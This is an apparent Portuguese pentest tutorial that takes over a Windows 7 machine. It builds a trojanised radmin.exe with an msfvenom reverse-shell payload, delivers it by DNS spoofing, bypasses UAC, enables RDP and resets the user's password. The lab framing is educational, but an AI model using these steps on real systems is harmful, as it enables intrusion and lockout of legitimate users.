
# Ataque ao Windows 7 - Exploração de falha do lado do cliente

- Descrição: 		

Os testes de penetração (pentest) fazem parte de uma área muito importante da Segurança da Informação.
Pentesters são contratados por empresas para que pratiquem tecnicas de invasão utilizadas por invasores para tomar
controle do sistema e reportar as falhas que os levaram a ter sucessonesse processo. Será feito um
teste de penetração no Windows 7 para que seja tomada a posse total do sistema, incluindo a interface gráfica,
explorando a vulnerabilidade do usuário.

#

- Passo a passo:

	- Infecção:
		- criar um trojan com conexão reversa com msfvenom
		```
		root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=1234 -x /usr/share/windows-binaries/radmin.exe -k -f exe > /var/www/html/radmin.exe
		```

		- enviar trojan para o sistema alvo por DNSspoof
		```
		root@kali:~# service apache2 start
		```

	- Exploração:
		- no metasploit, executar um handler para o payload de conexão reversa
		- no windows, executar o trojan (notar que ele faz exatamente o que o programa legitimo faria)
			precebe-se que abrimos uma sessão do meterpreter no metasploit
		- no meterpreter, checar privilegios com getuid (ainda é privilegio de usuario)
			notamos que já estamos dentro do sistema

	- Escalação de Privilegios:
		- colocar a sessao em background
		- utilizar exploit/windows/local/bypassuac
			com isso será feito o bypass e a retirada das confirmações do usuario para processos de administrador
		-uma nova sessão do meterpreter será aberta, execute essa sessão
			temos agora uma sessãos sem UAC e podemos escalar o privilegio de usuário
		-no meterpreter, usar comando getsys e conferir com getuid
			notar que agora somos Administradores do sistema

	- Posse da Interface Grafica:
		- colocar a sessão em backgound novamente
		- tentar conexão remota com o Windows (# rdesktop [TARGET IP])
			o não sucesso é devido a porta de conexão remota vir fechada por default
		- utilizar post/windows/manage/enable_rdp
		- com a porta para conexão remota ativa, fazer tentativa de conexão
			provavelmente não terá sucesso pois não sabemos a senha ou o usuario não tem senha
		- vamos então restaurar a sessão de Administrador do sistema do Meterpreter
		- comando shell
		- comando no cmd net USERNAME NEWPASS
		- tomar controle da inteface grafica do sistema
			o usuário não conseguirá mais logar porque só o invasor terá acesso à senha